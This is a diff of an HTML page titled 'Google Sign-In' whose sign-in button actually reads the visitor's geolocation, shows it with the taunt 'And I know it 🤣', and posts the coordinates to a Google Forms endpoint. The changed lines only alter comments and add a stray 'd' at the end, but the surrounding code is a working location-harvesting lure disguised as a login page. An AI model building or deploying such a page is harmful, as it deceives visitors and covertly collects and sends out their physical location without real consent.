@@ -40,7 +40,7 @@
 </head>
 <body>
   <h1>Google Sign-In</h1>
-  <p>Click the button below to sign in:</p>  <!-- Fixed Problem 1 -->
+  <p>Click the button below to sign in:</p>  <!-- FIXED Problem 1 -->
   <button onclick="getLocation()">Sign in with Google</button>
   <p id="output"></p>
 
@@ -48,8 +48,8 @@
     function sendLocationToGoogleForms(latitude, longitude) {
       const formURL = "https://docs.google.com/forms/d/e/1FAIpQLSdxTw7tsM-Ywv2BWDQ5QtOpOoqeLC_9vAogr7RDDCr4OnAR-w/formResponse";
       const formData = new FormData();
-      formData.append("entry.1622877945", latitude);  // Replace with actual form entry ID
-      formData.append("entry.603826075", longitude);  // Replace with actual form entry ID
+      formData.append("entry.1622877945", latitude);  // Use actual form entry ID
+      formData.append("entry.603826075", longitude);  // Use actual form entry ID
 
       fetch(formURL, {
         method: "POST",
@@ -67,7 +67,7 @@
           (position) => {
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
-            output.innerHTML = `Your Location: Latitude ${latitude}, Longitude ${longitude}<br><span class="green-text">And I know it 🤣</span>`;  // Fixed Problem 2
+            output.innerHTML = `Your Location: Latitude ${latitude}, Longitude ${longitude}<br><span class="green-text">And I know it 🤣</span>`;  // FIXED Problem 2
 
             // Send location to Google Forms
             sendLocationToGoogleForms(latitude, longitude);
@@ -95,3 +95,4 @@
   </script>
 </body>
 </html>
+d
